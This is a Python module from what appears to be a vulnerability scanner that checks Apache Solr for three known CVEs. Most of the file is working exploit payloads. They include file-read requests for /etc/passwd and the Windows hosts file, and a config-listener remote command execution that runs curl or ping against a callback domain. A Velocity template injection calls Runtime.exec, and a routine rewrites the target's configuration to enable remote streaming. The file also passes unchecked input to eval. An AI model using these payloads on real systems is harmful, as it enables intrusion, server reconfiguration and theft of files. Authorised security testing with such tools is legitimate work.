#!/usr/bin/env python3
# -*- coding:utf-8 -*-

'''
    ApacheSolr扫描类: 
        1. Solr SSRF/任意文件读取
            CVE-2021-27905
                Payload: https://vulhub.org/#/environments/solr/Remote-Streaming-Fileread/

        2. Solr 远程命令执行
            CVE-2017-12629
                Payload: https://vulhub.org/#/environments/solr/CVE-2017-12629-RCE/

        3. Solr Velocity 注入远程命令执行
            CVE-2019-17558
                Payload: https://vulhub.org/#/environments/solr/CVE-2019-17558/

file:///etc/passwd
file:///C:\Windows\System32\drivers\etc\hosts
'''

from lib.initial.config import config
from lib.tool.md5 import md5, random_md5, random_int_1, random_int_2
from lib.tool.logger import logger
from lib.tool.thread import thread
from thirdparty import requests
import re
from payloads.ApacheSolr.cve_2017_12629 import cve_2017_12629_scan
from payloads.ApacheSolr.cve_2019_17558 import cve_2019_17558_scan
from payloads.ApacheSolr.cve_2021_27905 import cve_2021_27905_scan

class Solr():
    def __init__(self):
        self.timeout = config.get('timeout')
        self.headers = config.get('headers')
        self.proxies = config.get('proxies')

        self.app_name = 'ApacheSolr'
        self.md = md5(self.app_name)
        self.cmd = 'echo ' + self.md

        self.db_name = ''
        self.RemoteStreaming = False
        self.params = False

        self.cve_2021_27905_payloads = [
            {
                'path': 'solr/{}/debug/dump',
                'data': 'param=ContentStreams&stream.url=file:///etc/passwd'
            },
            {
                'path': 'solr/{}/debug/dump',
                'data': 'param=ContentStreams&stream.url=file:///C:\Windows\System32\drivers\etc\hosts'
            },
            {
                'path': 'solr/{}/debug/dump',
                'data': 'param=ContentStreams&stream.url=file:///C:/Windows/System32/drivers/etc/hosts'
            },
        ]

        random_name = random_md5()
        self.cve_2017_12629_payloads = [
            {
                'path': 'solr/demo/config',
                'data': '{"add-listener":{"event":"postCommit","name":"' + random_name + '","class":"solr.RunExecutableListener","exe":"sh","dir":"/bin/","args":["-c", "curl DNSDOMAIN"]}}'
            },
            {
                'path': 'solr/demo/config',
                'data': '{"add-listener":{"event":"postCommit","name":"' + random_name + '","class":"solr.RunExecutableListener","exe":"sh","dir":"/bin/","args":["-c", "ping -c 4 DNSDOMAIN"]}}'
            },
            {
                'path': 'solr/demo/config',
                'data': '{"add-listener":{"event":"postCommit","name":"' + random_name + '","class":"solr.RunExecutableListener","exe":"sh","dir":"/bin/","args":["-c", "ping DNSDOMAIN"]}}'
            }
        ]

        self.cve_2019_17558_payloads = [
            {
                'path': "solr/{}/select?q=1&&wt=velocity&v.template=custom&v.template.custom=%23set($x=%27%27)+%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27" + self.cmd + "%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end",
                'data': ''
            },
        ]

    def enable(self, url):
        ''' 用于开启Solr的RemoteStreaming或自定义模板(params.resource.loader.enabled) '''
        if self.RemoteStreaming or self.params:
            return

        core_path = 'solr/admin/cores?indexInfo=false&wt=json' # * 获取数据库名称
        config_path = 'solr/{}/config'                         # * 使用数据库名称开启RemoteStreaming功能
        config_data = '{"set-property" : {"requestDispatcher.requestParsers.enableRemoteStreaming":true}}'
        params_data = '''{
  "update-queryresponsewriter": {
    "startup": "lazy",
    "name": "velocity",
    "class": "solr.VelocityResponseWriter",
    "template.base.dir": "",
    "solr.resource.loader.enabled": "true",
    "params.resource.loader.enabled": "true"
  }
}'''

        vul_info = {}
        vul_info['app_name'] = self.app_name
        vul_info['vul_type'] = 'Solr'
        vul_info['vul_id'] = 'Solr-enable'
        vul_info['headers'] = {
            'Content-Type': 'application/json'
        }

        target_core = url + core_path
        target_config = url + config_path

        headers = self.headers.copy()
        headers.update(vul_info['headers'])

        res1 = requests.get(
            target_core, 
            timeout=self.timeout, 
            headers=self.headers, 
            proxies=self.proxies, 
            verify=False
        )
        logger.logging(vul_info, res1.status_code, res1)                 # * LOG

        db_name = re.search(r'"name":".+"', res1.text, re.M|re.I)        # * 如果存在solr的数据库名称
        if db_name:
            db_name = db_name.group()
            db_name = db_name.replace('"name":', '')
            self.db_name = db_name.strip('"')                            # * 只保留双引号内的数据库名称

        if self.db_name:
            # todo 开启RemoteStreaming
            res2 = requests.post(
                target_config.format(self.db_name), 
                timeout=self.timeout, 
                headers=headers,
                data=config_data, 
                proxies=self.proxies, 
                verify=False,
                allow_redirects=False
            )
            logger.logging(vul_info, res2.status_code, res2)
            if (res2.status_code == 200):
                self.RemoteStreaming = True

            # todo 开启params.resource.loader.enabled
            res3 = requests.post(
                target_config.format(self.db_name), 
                timeout=self.timeout, 
                headers=headers,
                data=params_data, 
                proxies=self.proxies, 
                verify=False,
                allow_redirects=False
            )
            logger.logging(vul_info, res3.status_code, res3)
            if (res3.status_code == 200):
                self.params = True

    def addscan(self, url, vuln=None):
        if vuln:
            return eval('thread(target=self.{}_scan, url="{}")'.format(vuln, url))

        return [
            thread(target=self.cve_2017_12629_scan, url=url),
            thread(target=self.cve_2019_17558_scan, url=url),
            thread(target=self.cve_2021_27905_scan, url=url),
        ]

Solr.cve_2017_12629_scan = cve_2017_12629_scan
Solr.cve_2019_17558_scan = cve_2019_17558_scan
Solr.cve_2021_27905_scan = cve_2021_27905_scan

solr = Solr()